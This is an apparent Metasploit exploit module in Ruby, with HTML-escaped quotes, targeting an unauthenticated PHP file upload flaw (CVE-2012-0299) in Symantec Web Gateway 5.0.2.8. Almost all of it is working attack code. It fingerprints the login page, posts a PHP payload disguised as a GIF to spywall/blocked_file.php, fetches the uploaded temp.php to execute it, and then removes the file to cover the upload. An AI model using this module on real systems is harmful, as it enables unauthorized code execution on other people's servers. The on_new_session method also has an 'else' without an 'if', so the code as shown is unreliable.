# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Symantec Web Gateway 5.0.2.8 Arbitrary PHP File Upload Vulnerability",
            &#039;Description&#039;    => %q{
                    This module exploits a file upload vulnerability found in Symantec Web Gateway&#039;s
                HTTP service. Due to the incorrect use of file extensions in the upload_file()
                function, this allows us to abuse the spywall/blocked_file.php file in order to
                upload a malicious PHP file without any authentication, which results in arbitrary
                code execution.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Tenable Network Security&#039;, # Vulnerability Discovery
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-0299&#039; ],
                    [ &#039;OSVDB&#039;, &#039;82025&#039; ],
                    [ &#039;BID&#039;, &#039;53443&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-12-091&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00"
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "none"
                },
            &#039;Platform&#039;       => [&#039;php&#039;],
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        =>
                [
                    [&#039;Symantec Web Gateway 5.0.2.8&#039;, {}],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "May 17 2012",
            &#039;DefaultTarget&#039;  => 0))
    end
 
 
    def check
        res = send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => &#039;/spywall/login.php&#039;
        })
 
        if res and res.body =~ /\<title\>Symantec Web Gateway\<\/title\>/
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def on_new_session(client)
            client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
            client.fs.file.rm("temp.php")
        else
            client.shell_command_token("rm temp.php")
        end
    end
 
    def exploit
        uri = target_uri.path
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
 
        peer = "#{rhost}:#{rport}"
        payload_name = Rex::Text.rand_text_alpha(rand(10) + 5) + &#039;.php&#039;
        before_filename = rand_text_alpha(rand(10) + 5)
        after_filename = rand_text_alpha(rand(10) + 5)
 
        post_data = Rex::MIME::Message.new
        post_data.add_part("true", nil, nil, "form-data; name=\"submitted\"")
        post_data.add_part(before_filename, "application/octet-stream", nil, "form-data; name=\"before_filename\"")
        post_data.add_part(after_filename, "application/octet-stream", nil, "form-data; name=\"after_filename\"")
        post_data.add_part("<?php #{payload.encoded} ?>", "image/gif", nil, "form-data; name=\"new_image\"; filename=\"#{payload_name}\"")
 
        print_status("#{peer} - Sending PHP payload (#{payload_name})")
        res = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039;    => "#{uri}spywall/blocked_file.php",
            &#039;ctype&#039;  => "multipart/form-data; boundary=#{post_data.bound}",
            &#039;data&#039;   => post_data.to_s
        })
 
        # If the server returns 200 and the body contains the name
        # of the default file, we assume we uploaded the malicious
        # file successfully
        if not res or res.code != 200 or res.body !~ /temp.php/
            print_error("#{peer} - File wasn&#039;t uploaded, aborting!")
            return
        end
 
        print_status("#{peer} - Executing PHP payload (#{payload_name})")
        # Execute our payload
        res = send_request_cgi({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "#{uri}spywall/images/upload/temp/temp.php"
        })
 
        # If we don&#039;t get a 200 when we request our malicious payload, we suspect
        # we don&#039;t have a shell, either.  Print the status code for debugging purposes.
        if res and res.code != 200
            print_status("#{peer} - Server returned #{res.code.to_s}")
        end
    end
 
end



